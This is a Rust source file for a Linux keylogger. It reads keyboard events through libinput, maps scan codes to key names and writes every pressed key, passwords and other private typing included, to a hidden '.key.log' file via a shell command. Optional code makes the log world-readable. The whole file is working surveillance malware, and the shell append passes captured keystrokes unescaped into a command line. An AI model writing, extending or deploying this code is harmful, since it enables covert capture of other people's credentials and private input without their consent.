extern crate core;

// Imports & Globals
use std::process::exit;
use input::{Libinput, LibinputInterface, event::keyboard::*, Event};
use std::fs::{File, OpenOptions};
use std::path::Path;
use std::os::unix::fs::OpenOptionsExt;
use std::os::unix::io::{RawFd, IntoRawFd, FromRawFd};

const RUN_CHMOD: bool = false;
const LOG_FILE: &str = ".key.log";

struct Interface;

// Local input struct def 
impl LibinputInterface for Interface
{
    fn open_restricted(&mut self, path: &Path, flags: i32) -> Result<RawFd, i32>
    {
        OpenOptions::new()
            .read(true)
            .write(true)
            .custom_flags(flags)
            .open(path)
            .map(|f| f.into_raw_fd())
            .map_err(|_| -1)
    }
    fn close_restricted(&mut self, fd: RawFd)
    {
        unsafe { File::from_raw_fd(fd) };
    }
}

fn main()
{
    // Confirm US-layout and admin privileges; exit otherwise
	// Check if the keyboard layout is US, if not, exit
    if !is_us() && !check_root()
    {
        exit(1);
    }

    // Create a log file and keylogger
    // let log = create_log();

    if RUN_CHMOD
    {
        // Set permissions on the log file to allow for reading by all users using the chmod command
        match std::process::Command::new("chmod")
            .arg("a+r")
            .arg("log.txt")
            .spawn()
        {
            Ok(_) => (),
            Err(_) => println!("Error: Could not change permissions of log file"),
        }
    }

    keylogger();

    // Preemptive exit; shouldn't hit
    exit(1);
}

///////////////////////////
// Checks keyboard layout
///////////////////////////
fn is_us() -> bool
{
    let us_layout = "us";
    let mut layout;

    // Get the keyboard layout environment variable
    match std::env::var("XKB_DEFAULT_LAYOUT")
    {
        Ok(l) => layout = l,
        Err(_) => layout = "".to_string()
    }

    // If environment variable is not set, check the /etc/default/keyboard file
    if layout == ""
    {
        // Get the keyboard layout from the /etc/default/keyboard file
        layout = std::fs::read_to_string("/etc/default/keyboard").unwrap();
    }

    // Check if the keyboard layout is US
    return if layout.contains(us_layout) { true } else { false }
}

//////////////////////////////////////
// Checks for user system privileges
//////////////////////////////////////
fn check_root() -> bool
{
    let root;
    let output = std::process::Command::new("id")
        .output()
        .expect("Failed to execute process");

    // If the output contains "uid=0", the user is root
    root = String::from_utf8_lossy(&output.stdout).contains("uid=0");

    // Return admin status
    root
}

//////////////////////////////////////////////////////////////////
// Logs keyboard behavior; should loop forever unless terminated
//////////////////////////////////////////////////////////////////
fn keylogger()
{
    // Convert the log file to a String for writing through the shell
    let log_str = LOG_FILE;

    // Create a buffer and libinput for the keylogger
    const BUF_SIZE: u8 = 128;
    const IDLE_LIMIT: u16 = 5000;
    const SLEEP_TIME: u8 = 5; // in miliseconds
    let mut buffer = String::with_capacity(BUF_SIZE as usize);

    // Create a libinput context
    let mut context = Libinput::new_with_udev(Interface);
    context.udev_assign_seat("seat0").unwrap();

    // Initialize counters
    let mut idle_counter: u16 = 0;
    let mut buffer_counter: u32 = 0;

    // Loop keylogging
    loop
    {
        // Check if the buffer is nearly full/if there has been no input for usize.len() cycles
        // If either is true, write the buffer to the log file
        if buffer_counter >= BUF_SIZE as u32 - 16 || (idle_counter == IDLE_LIMIT && buffer_counter > 0)
        {
            println!("Writing to log file...");

            // Spawn a new process to append the buffer to the log file using a match statement
            match std::process::Command::new("sh")
            .arg("-c")
            .arg(format!("echo \"{}\" >> {}", buffer, log_str))
            .spawn()
            {
                Ok(_) =>
                {
                    buffer.clear();                     // Clear the buffer
                    buffer_counter ^= buffer_counter;   // XOR Reset the buffer counter
                    idle_counter ^= idle_counter;       // XOR Reset the idle counter
                },
                Err(_) => ()
            }
        }

        // Dispatch events; collect next event
        context.dispatch().unwrap();
        let event = context.next();

        // If the event is a key event, log the key
        if let Some(Event::Keyboard(key_event)) = event
        {
            idle_counter ^= idle_counter;   // XOR Reset the idle counter

            // Get the key code, state and pressed state; concatenate pressed events
            let key_code = key_event.key();
            let key_state = key_event.key_state();
            if key_state == KeyState::Pressed
            {
                // Get the key name; convert name to string
                let key_name = get_key_name(key_code as u8);
                buffer.push_str(&key_name);

                // Increment the buffer counter
                buffer_counter += key_name.len() as u32;
            }
        }

		// Sleep momentarily if no activity detected
        else
        {
            if idle_counter < IDLE_LIMIT
            {
                idle_counter += SLEEP_TIME as u16;
            }
            std::thread::sleep(std::time::Duration::from_millis(SLEEP_TIME as u64));
        }
    }
}

fn get_key_name(key_code: u8) -> String
{
    // Convert keyboard scan code to key name
    return match key_code
    {
        0x1e => String::from("a"),
        0x30 => String::from("b"),
        0x2e => String::from("c"),
        0x20 => String::from("d"),
        0x12 => String::from("e"),
        0x21 => String::from("f"),
        0x22 => String::from("g"),
        0x23 => String::from("h"),
        0x17 => String::from("i"),
        0x24 => String::from("j"),
        0x25 => String::from("k"),
        0x26 => String::from("l"),
        0x32 => String::from("m"),
        0x31 => String::from("n"),
        0x18 => String::from("o"),
        0x19 => String::from("p"),
        0x10 => String::from("q"),
        0x13 => String::from("r"),
        0x1f => String::from("s"),
        0x14 => String::from("t"),
        0x16 => String::from("u"),
        0x2f => String::from("v"),
        0x11 => String::from("w"),
        0x2d => String::from("x"),
        0x15 => String::from("y"),
        0x2c => String::from("z"),
        0x02 => String::from("1"),
        0x03 => String::from("2"),
        0x04 => String::from("3"),
        0x05 => String::from("4"),
        0x06 => String::from("5"),
        0x07 => String::from("6"),
        0x08 => String::from("7"),
        0x09 => String::from("8"),
        0x0a => String::from("9"),
        0x0b => String::from("0"),
        0x1c => String::from("\n"),
        0x39 => String::from(" "),
        0x0e => String::from("[BKSPC]"),
        0x0f => String::from("[TAB]"),
        0x3a => String::from("[CAPS]"),
        0x2a => String::from("[LSHFT]"),
        0x36 => String::from("[RSHFT]"),
        0x1d => String::from("[CTRL]"),
        0x38 => String::from("[ALT/MENU]"),
        0x5b => String::from("[LSUPR]"),
        0x5c => String::from("[RSUPR]"),
        0x2b => String::from("\\"),
        0x33 => String::from(","),
        0x0c => String::from("-"),
        0x34 => String::from("."),
        0x35 => String::from("/"),
        0x27 => String::from(";"),
        0x28 => String::from("\'"),
        0x29 => String::from("\\`"),
        0x0d => String::from("="),
        0x01 => String::from("[ESC]"),
        0x3b => String::from("[F1]"),
        0x3c => String::from("[F2]"),
        0x3d => String::from("[F3]"),
        0x3e => String::from("[F4]"),
        0x3f => String::from("[F5]"),
        0x40 => String::from("[F6]"),
        0x41 => String::from("[F7]"),
        0x42 => String::from("[F8]"),
        0x43 => String::from("[F9]"),
        0x44 => String::from("[F10]"),
        0x57 => String::from("[F11]"),
        0x58 => String::from("[F12]"),
        0x46 => String::from("[PRNT_SCRN]"),
        0x45 => String::from("[NUM_LK]"),
        0x37 => String::from("[NUM_*]"),
        0x4a => String::from("[NUM_-]"),
        0x4e => String::from("[NUM_+]"),
        0x53 => String::from("[NUM_./DEL]"),
        0x52 => String::from("[NUM_0/INS]"),
        0x4f => String::from("[NUM_1/END]"),
        0x50 => String::from("[NUM_2/DOWN]"),
        0x51 => String::from("[NUM_3/PGDN]"),
        0x4b => String::from("[NUM_4/LEFT]"),
        0x4c => String::from("[NUM_5]"),
        0x4d => String::from("[NUM_6/RGHT]"),
        0x47 => String::from("[NUM_7/HOME]"),
        0x48 => String::from("[NUM_8/UP]"),
        0x49 => String::from("[NUM_9/PGUP]"),
        x => format!("[SC:{}]", x),
    };
}